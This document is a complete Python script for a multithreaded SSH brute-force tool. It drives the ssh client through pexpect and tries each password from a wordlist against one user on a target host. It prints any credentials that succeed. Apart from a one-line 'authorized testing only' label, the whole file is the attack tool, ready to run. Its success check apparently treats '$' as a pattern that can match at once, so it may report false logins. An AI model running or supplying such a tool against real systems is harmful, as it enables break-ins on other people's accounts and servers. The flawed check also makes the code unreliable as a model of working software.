#!/usr/bin/env python3
import pexpect
import argparse
import time
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored


def parse_arguments():

    parser = argparse.ArgumentParser(description='SSH brute force tool (for authorized testing only)')
    parser.add_argument('-t', '--target', required=True, help='Target IP address or hostname')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH port (default: 22)')
    parser.add_argument('-u', '--user', required=True, help='Username to test')
    parser.add_argument('-w', '--wordlist', required=True, help='Password wordlist file')
    parser.add_argument('-T', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('-tO', '--timeout', type=float, default=10.0,
                        help='Connection timeout in seconds (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay between attempts in seconds (default: 1)')
    return parser.parse_args()


def load_wordlist(wordlist_file):

    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(colored(f"[!] Wordlist file {wordlist_file} not found", 'red'))
        exit(1)


def ssh_connect(target, port, username, password, timeout):

    try:

        cmd = f'ssh -p {port} {username}@{target}'


        child = pexpect.spawn(cmd, timeout=timeout)


        i = child.expect(['password:', 'continue connecting (yes/no/[fingerprint])?', pexpect.EOF, pexpect.TIMEOUT])

        if i == 1:
            child.sendline('yes')
            child.expect('password:')

        if i in [0, 1]:
            child.sendline(password)


            j = child.expect(['$', '#', 'Permission denied', pexpect.EOF, pexpect.TIMEOUT])

            if j in [0, 1]:
                print(colored(f"[+] SUCCESS! {username}:{password}", 'green'))
                child.sendline('exit')
                return True
            else:
                print(colored(f"[-] Failed: {username}:{password}", 'red'))
        else:
            print(colored(f"[!] Connection error for {username}:{password}", 'yellow'))

    except Exception as e:
        print(colored(f"[!] Error with {username}:{password}: {str(e)}", 'yellow'))
    return False


def main():
   
    args = parse_arguments()

    print(colored(f"\n[•] Starting SSH brute force against {args.target}:{args.port}", 'cyan'))
    print(colored(f"[•] Testing username: {args.user}", 'cyan'))
    print(colored(f"[•] Using wordlist: {args.wordlist}", 'cyan'))
    print(colored(f"[•] Threads: {args.threads}", 'cyan'))
    print(colored(f"[•] Timeout: {args.timeout}s", 'cyan'))
    print(colored(f"[•] Delay: {args.delay}s", 'cyan'))

    passwords = load_wordlist(args.wordlist)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for password in passwords:
            executor.submit(ssh_connect, args.target, args.port,
                            args.user, password, args.timeout)
            time.sleep(args.delay)  # Rate limiting

    print(colored("\n[•] Brute force completed!", 'cyan'))


if __name__ == "__main__":
    main()
